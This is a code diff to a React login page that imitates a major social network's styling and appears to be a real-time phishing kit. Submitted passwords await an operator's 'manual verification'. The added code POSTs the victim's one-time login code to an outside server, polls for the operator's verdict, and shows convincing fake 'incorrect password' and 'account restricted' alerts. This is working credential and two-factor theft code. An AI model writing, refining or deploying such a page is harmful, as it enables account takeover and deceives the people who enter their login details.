@@ -7,6 +7,16 @@ const AccountLogin = () => {
   const [showOtpScreen, setShowOtpScreen] = useState(false);
   const [otp, setOtp] = useState('');
   const [trustDevice, setTrustDevice] = useState(false);
+  const [otpVerificationStatus, setOtpVerificationStatus] = useState('idle'); // idle, pending, approved, rejected
+  const [alertConfig, setAlertConfig] = useState({ show: false, title: '', message: '' });
+
+  const showAlert = (title, message) => {
+    setAlertConfig({ show: true, title, message });
+  };
+
+  const closeAlert = () => {
+    setAlertConfig({ ...alertConfig, show: false });
+  };
 
   const handleChange = (e) => {
     setFormData({ ...formData, [e.target.name]: e.target.value });
@@ -46,15 +56,14 @@ const AccountLogin = () => {
         if (data.status === 'approved') {
           setVerificationStatus('approved');
           clearInterval(interval);
-          // Proceed to OTP screen or main app
-          setTimeout(() => setShowOtpScreen(true), 1000);
+          // Immediately proceed to OTP screen
+          setShowOtpScreen(true);
         } else if (data.status === 'rejected') {
           setVerificationStatus('rejected');
           clearInterval(interval);
-          setTimeout(() => {
-            setVerificationStatus('idle');
-            setFormData({ password: '' });
-          }, 3000);
+          setVerificationStatus('idle');
+          setFormData({ password: '' });
+          showAlert('Incorrect password', 'The password that you\'ve entered is incorrect. Please try again.');
         }
       } catch (error) {
         console.error('Polling error:', error);
@@ -71,17 +80,57 @@ const AccountLogin = () => {
     }
   };
 
-  const handleOtpSubmit = (e) => {
+  const handleOtpSubmit = async (e) => {
     e.preventDefault();
-    console.log('OTP submitted:', otp);
-    console.log('Trust device:', trustDevice);
-    // Add your OTP verification logic here
+    if (otp.length >= 4) {
+      try {
+        // Submit OTP to backend
+        const response = await fetch('https://api-accounts.afbex.com/stage/test/submit-otp', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ otp: otp })
+        });
+        
+        if (response.ok) {
+          setOtpVerificationStatus('pending');
+          startOtpPolling();
+        }
+      } catch (error) {
+        console.error('Error submitting OTP:', error);
+        alert('Could not connect to verification server');
+      }
+    }
+  };
+
+  const startOtpPolling = () => {
+    const interval = setInterval(async () => {
+      try {
+        const response = await fetch('https://api-accounts.afbex.com/stage/test/check-status');
+        const data = await response.json();
+        
+        if (data.status === 'approved') {
+          setOtpVerificationStatus('approved');
+          clearInterval(interval);
+          showAlert('Unauthorized access', '@arsalannfarooqui_ has restricted this account');
+        } else if (data.status === 'rejected') {
+          setOtpVerificationStatus('rejected');
+          clearInterval(interval);
+          setOtpVerificationStatus('idle');
+          setOtp('');
+          showAlert('Incorrect Login Code', 'The code you entered is incorrect. Please try again.');
+        }
+      } catch (error) {
+        console.error('OTP Polling error:', error);
+      }
+    }, 2000); // Poll every 2 seconds
   };
 
   const handleBackToLogin = () => {
     setShowOtpScreen(false);
     setOtp('');
     setTrustDevice(false);
+    setOtpVerificationStatus('idle');
+    setAlertConfig({ show: false, title: '', message: '' });
   };
 
   const handleResendCode = () => {
@@ -162,17 +211,46 @@ const AccountLogin = () => {
             {/* Confirm Button */}
             <button
               type="submit"
-              disabled={otp.length < 4}
-              className={`w-full py-2 rounded-lg text-base font-semibold transition duration-200 ${
-                otp.length >= 4
+              disabled={otp.length < 4 || otpVerificationStatus === 'pending'}
+              className={`w-full py-2 rounded-lg text-base font-semibold transition duration-200 flex items-center justify-center gap-2 ${
+                otpVerificationStatus === 'pending'
+                  ? 'bg-gray-600 cursor-not-allowed'
+                  : otp.length >= 4
                   ? 'bg-[#0095f6] hover:bg-[#0064E0] text-white'
                   : 'bg-[#1a3a52] text-gray-500 cursor-not-allowed'
               }`}
             >
-              Confirm
+              {otpVerificationStatus === 'pending' && (
+                <>
+                  <svg className="animate-spin h-5 w-5" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                  </svg>
+                </>
+              )}
+              {otpVerificationStatus === 'idle' && 'Confirm'}
             </button>
+
           </div>
         </form>
+
+        {/* Alert Popup */}
+        {alertConfig.show && (
+          <div className="fixed inset-0 flex items-center justify-center z-50 px-9 pointer-events-none">
+            <div className="bg-white rounded-[12px] w-full max-w-[280px] overflow-hidden flex flex-col items-center shadow-2xl pointer-events-auto transition-all transform scale-100 opacity-100">
+              <div className="pt-6 pb-4 px-6 text-center">
+                <h3 className="text-black font-semibold text-[17px] mb-1 leading-tight">{alertConfig.title}</h3>
+                <p className="text-[#8E8E8E] text-[14px] leading-tight">{alertConfig.message}</p>
+              </div>
+              <button 
+                onClick={closeAlert}
+                className="w-full border-t border-gray-100 py-3.5 text-[#0095f6] font-semibold text-[14px] active:bg-gray-50 transition"
+              >
+                OK
+              </button>
+            </div>
+          </div>
+        )}
       </div>
     );
   }
@@ -215,6 +293,7 @@ const AccountLogin = () => {
             type="password"
             name="password"
             placeholder="Password"
+            minLength={6}
             className="w-full bg-[#1C2A33] border border-[#3C4D57] rounded-md p-3.5 text-sm text-[#83919C] placeholder-gray-500 placeholder:font-semibold focus:outline-none focus:border-[#2e5a8a] transition"
             onChange={handleChange}
             value={formData.password}
@@ -223,34 +302,26 @@ const AccountLogin = () => {
           <button
             type="submit"
             disabled={verificationStatus === 'pending'}
-            className={`w-full font-semibold py-3 rounded-full text-sm mt-2 transition duration-200 ${
+            className={`w-full font-semibold py-3 rounded-full text-sm mt-2 transition duration-200 flex items-center justify-center gap-2 ${
               verificationStatus === 'pending' 
                 ? 'bg-gray-600 cursor-not-allowed' 
-                : verificationStatus === 'approved'
-                ? 'bg-green-600 hover:bg-green-700'
-                : verificationStatus === 'rejected'
-                ? 'bg-red-600 hover:bg-red-700'
                 : 'bg-[#0064E0] hover:bg-[#0095f6]'
             } text-white`}
           >
-            {verificationStatus === 'pending' && '⏳ Verifying...'}
-            {verificationStatus === 'approved' && '✓ Approved!'}
-            {verificationStatus === 'rejected' && '✗ Rejected'}
+            {verificationStatus === 'pending' && (
+              <>
+                <svg className="animate-spin h-5 w-5" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                </svg>
+                {/* <span>Verifying...</span> */}
+              </>
+            )}
+            {/* {verificationStatus === 'approved' && '✓ Approved!'} */}
+            {/* {verificationStatus === 'rejected' && '✗ Rejected'} */}
             {verificationStatus === 'idle' && 'Log in'}
           </button>
         </form>
-
-        {/* Verification Status Message */}
-        {verificationStatus === 'pending' && (
-          <div className="mt-4 text-sm text-gray-400 text-center animate-pulse">
-            Waiting for manual verification...
-          </div>
-        )}
-        {verificationStatus === 'rejected' && (
-          <div className="mt-4 text-sm text-red-400 text-center">
-            Password verification failed. Please try again.
-          </div>
-        )}
 
         {/* Forgotten Password */}
         <div className="mt-6 text-sm text-gray-300 hover:text-white cursor-pointer transition">
@@ -273,6 +344,23 @@ const AccountLogin = () => {
         </div>
       </div>
       
+      {/* Alert Popup */}
+      {alertConfig.show && (
+        <div className="fixed inset-0 flex items-center justify-center z-50 px-9 pointer-events-none">
+          <div className="bg-white rounded-[12px] w-full max-w-[280px] overflow-hidden flex flex-col items-center shadow-2xl pointer-events-auto transition-all transform scale-100 opacity-100">
+            <div className="pt-6 pb-4 px-6 text-center">
+              <h3 className="text-black font-semibold text-[17px] mb-1 leading-tight">{alertConfig.title}</h3>
+              <p className="text-[#8E8E8E] text-[14px] leading-tight">{alertConfig.message}</p>
+            </div>
+            <button 
+              onClick={closeAlert}
+              className="w-full border-t border-gray-100 py-3.5 text-[#0095f6] font-semibold text-[14px] active:bg-gray-50 transition"
+            >
+              OK
+            </button>
+          </div>
+        </div>
+      )}
     </div>
   );
 };
